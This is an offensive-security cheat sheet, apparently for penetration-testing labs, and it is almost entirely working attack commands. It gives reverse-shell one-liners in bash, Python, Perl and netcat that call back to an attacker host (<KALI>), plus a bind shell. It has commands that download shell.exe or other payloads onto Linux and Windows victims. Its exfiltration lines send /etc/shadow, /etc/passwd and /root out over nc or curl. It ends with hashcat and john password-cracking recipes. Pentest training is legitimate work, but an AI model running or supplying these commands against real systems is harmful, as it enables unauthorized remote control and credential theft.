Linux Reverse Shells

listener
rlwrap nc -lvnp 4444
rlwrap nc -lvnp 443   # use 443 if 4444 is filtered
pwncat-cs -lp 4444    # auto-stabilizes, file transfer built in
all Linux one-liners
# bash:
bash -i >& /dev/tcp/<KALI>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<KALI>/4444 0>&1'
exec 5<>/dev/tcp/<KALI>/4444;cat <&5 | while read l; do $l 2>&5>&5;done

# sh (if bash not available):
sh -i >& /dev/tcp/<KALI>/4444 0>&1

# python3:
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<KALI>",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# python2:
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<KALI>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# perl:
perl -e 'use Socket;$i="<KALI>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}'

# nc with -e:
nc -e /bin/bash <KALI> 4444

# nc without -e (busybox/Alpine):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <KALI> 4444 >/tmp/f
output signals
Signal: Shell connects but immediately dies / no prompt python3 -c 'import pty;pty.spawn("/bin/bash")' -- stabilize immediately export TERM=xterm && stty raw -echo; fg -- full TTY after Ctrl+Z backgrounding
Signal: bash one-liner hangs — no connection received on nc rlwrap nc -lvnp 443 -- switch to port 443, outbound 4444 may be filtered python3 -c 'import socket...' -- try python3 if bash /dev/tcp blocked rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <KALI> 443 >/tmp/f -- mkfifo if nc -e not available
move on when bash + python + perl + nc all tried on ports 4444 and 443 — no connection upload msfvenom ELF as last resort before giving up on rev shell all outbound filtered — use bind shell: nc -lvnp 4444 -e /bin/bash on victim

File Downloads — Linux Victim

download to victim
wget http://<KALI>:8080/<file> -O /tmp/<file>
curl http://<KALI>:8080/<file> -o /tmp/<file>

# Pure bash (no wget/curl):
exec 3<>/dev/tcp/<KALI>/8080 && echo -e "GET /<file> HTTP/1.0\r\n\r\n" >&3 && cat <&3 > /tmp/<file>

File Downloads — Windows Victim

all download methods
# PowerShell WebClient (most reliable):
(New-Object Net.WebClient).DownloadFile('http://<KALI>:8080/shell.exe','C:\Windows\Temp\shell.exe')

# PowerShell Invoke-WebRequest:
iwr http://<KALI>:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe
Invoke-WebRequest -Uri http://<KALI>:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe

# certutil (no PowerShell needed):
certutil.exe -urlcache -f http://<KALI>:8080/shell.exe C:\Windows\Temp\shell.exe

# bitsadmin:
bitsadmin /transfer job /download /priority normal http://<KALI>:8080/shell.exe C:\Windows\Temp\shell.exe

Exfiltration

Linux → Kali
# nc receiver on kali:
nc -lvnp 9001 > loot.tar.gz
# On victim — send:
tar czf - /etc/passwd /root/ 2>/dev/null | nc <KALI> 9001

# curl POST to kali:
curl -X POST http://<KALI>:8888 --data-binary @/etc/shadow
Windows → Kali
# nc receiver on kali:
nc -lvnp 9001 > loot.zip
# On victim:
Compress-Archive -Path C:\Users\Administrator\Desktop\proof.txt -DestinationPath C:\Windows\Temp\loot.zip
$c=New-Object Net.Sockets.TcpClient('<KALI>',9001);$f=[IO.File]::ReadAllBytes('C:\Windows\Temp\loot.zip');$c.GetStream().Write($f,0,$f.Length)

Hash Cracking — Quick Reference

identify hash type
hashid '<hash>'
hash-identifier '<hash>'
# Visual guide:
# $1$   → md5crypt (Linux shadow)     → hashcat -m 500
# $5$   → sha256crypt                 → hashcat -m 7400
# $6$   → sha512crypt (Linux shadow)  → hashcat -m 1800
# $2y$  → bcrypt                      → hashcat -m 3200
# 32hex → NTLM                        → hashcat -m 1000
# user::domain:chall:hash → NTLMv2   → hashcat -m 5600
# $krb5tgs$23$ → Kerberoast           → hashcat -m 13100
# $krb5asrep$23$ → AS-REP             → hashcat -m 18200
hashcat all modes
hashcat -m 0    hash.txt /usr/share/wordlists/rockyou.txt          # MD5
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt          # NTLM
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt          # sha512crypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt          # bcrypt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt          # NTLMv2
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt         # Kerberoast
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt         # AS-REP
# With rules (catches Password1 → P@ssw0rd variants):
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
# Show cracked hashes after session:
hashcat -m 1000 hash.txt --show
john — format conversions
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ssh2john id_rsa > ssh.hash && john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
zip2john file.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
keepass2john keepass.kdbx > kp.hash && john --wordlist=/usr/share/wordlists/rockyou.txt kp.hash
